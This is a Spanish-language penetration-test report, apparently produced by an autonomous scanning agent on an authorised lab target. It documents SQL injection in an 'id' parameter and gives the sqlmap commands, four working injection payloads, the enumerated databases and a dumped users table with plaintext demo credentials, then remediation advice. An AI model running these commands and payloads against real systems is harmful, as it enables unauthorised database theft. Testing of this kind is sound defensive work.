# Informe de Auditoría de Seguridad – SQL Injection
**Fecha:** 2026-04-21T07:07:46  
**Objetivo:** http://web.dev.local:8083  
**Analista:** Agente Autónomo de Seguridad Ofensiva (DAST)  
**Modelo:** Claude Sonnet 4.6  

---

## 1. Resumen Ejecutivo

Se realizó un análisis de seguridad completo sobre la aplicación web en `http://web.dev.local:8083`. Se identificó una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` del método GET. La vulnerabilidad fue explotada con éxito, permitiendo la extracción completa de la base de datos `sqli_demo`, incluyendo credenciales de 8 usuarios.

**Severidad:** 🔴 CRÍTICA  
**Estado:** Vulnerabilidad confirmada y explotada

---

## 2. Fase 1 – Reconocimiento

Se inspeccionó la URL objetivo con `curl`. La aplicación presenta:

- **Tecnología:** PHP 8.1.33, Apache 2.4.65 sobre Linux Debian
- **DBMS backend:** MySQL >= 5.1 (fork MariaDB)
- **Formulario detectado:** `GET /?id=<valor>&Submit=Submit`
- **Vector de entrada:** Parámetro `id` en query string (método GET)

```
Endpoint: http://web.dev.local:8083/?id=1&Submit=Submit
Parámetro vulnerable: id
Método: GET
```

La respuesta al parámetro `id=1` devuelve datos de usuario:
```
ID: 1
First name: John
Surname: Doe
```

---

## 3. Fase 2 – Escaneo de Vulnerabilidades

Se ejecutó `sqlmap` sobre el endpoint identificado:

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch --level=2 --risk=2
```

### Resultado: VULNERABLE ✅

sqlmap detectó **4 técnicas de inyección** en el parámetro `id`:

| Técnica | Título |
|---------|--------|
| Boolean-based blind | OR boolean-based blind - WHERE or HAVING clause (NOT) |
| Error-based | MySQL >= 5.1 AND error-based - EXTRACTVALUE |
| Time-based blind | MySQL >= 5.0.12 AND time-based blind (SLEEP) |
| UNION query | Generic UNION query (NULL) - 2 columns |

### Payloads detectados:

```sql
-- Boolean-based blind
id=1' OR NOT 8214=8214-- AqsF

-- Error-based
id=1' AND EXTRACTVALUE(7830,CONCAT(0x5c,0x716b787a71,(SELECT (ELT(7830=7830,1))),0x71766a7071))-- vHQx

-- Time-based blind
id=1' AND (SELECT 5876 FROM (SELECT(SLEEP(5)))XpeC)-- tpQt

-- UNION query
id=1' UNION ALL SELECT CONCAT(0x716b787a71,0x767a...,0x71766a7071),NULL-- -
```

---

## 4. Fase 3 – Explotación Activa

### 4.1 Extracción de usuario y base de datos actual

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch \
  --current-user --current-db --dbs
```

**Resultados:**
- **Usuario de BD:** `root@%`
- **Base de datos activa:** `sqli_demo`
- **Bases de datos disponibles:**
  - `information_schema`
  - `mysql`
  - `performance_schema`
  - `sqli_demo`
  - `sys`

### 4.2 Enumeración de tablas

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch \
  -D sqli_demo --tables
```

**Tablas en `sqli_demo`:**
- `users`

### 4.3 Volcado de la tabla `users`

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch \
  -D sqli_demo -T users --dump
```

**Datos extraídos (8 registros):**

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

**Explotación exitosa:** Se extrajeron credenciales en texto plano de 8 usuarios, incluyendo el usuario `admin`.

---

## 5. Vectores Analizados

| Vector | URL | Parámetro | Método | Resultado |
|--------|-----|-----------|--------|-----------|
| Formulario búsqueda de usuario | `/?id=1&Submit=Submit` | `id` | GET | **VULNERABLE** |

---

## 6. Conclusión y Recomendaciones

### Conclusión

La aplicación web en `http://web.dev.local:8083` es **críticamente vulnerable** a SQL Injection clásica en el parámetro `id`. El servidor ejecuta con usuario `root` de base de datos, lo que amplía enormemente el impacto potencial. Las contraseñas se almacenan en **texto plano**, agravando la gravedad del hallazgo.

### Impacto
- Acceso completo a todas las bases de datos del servidor
- Extracción de credenciales de todos los usuarios
- Potencial escalada a ejecución de comandos del sistema (`--os-shell`)

### Recomendaciones

1. **Usar consultas preparadas (Prepared Statements)** con parámetros enlazados en lugar de concatenación de cadenas SQL.
2. **Validar y sanitizar** todas las entradas del usuario.
3. **Principio de mínimo privilegio**: el usuario de BD debe tener solo los permisos necesarios (no `root`).
4. **Hashear contraseñas** con algoritmos seguros (bcrypt, Argon2) en lugar de texto plano.
5. **Implementar WAF** (Web Application Firewall) como capa adicional de protección.
6. **Auditoría de código** completa para identificar todos los puntos de concatenación SQL en la aplicación.

---

*Informe generado automáticamente por Agente DAST – Entorno de laboratorio autorizado*
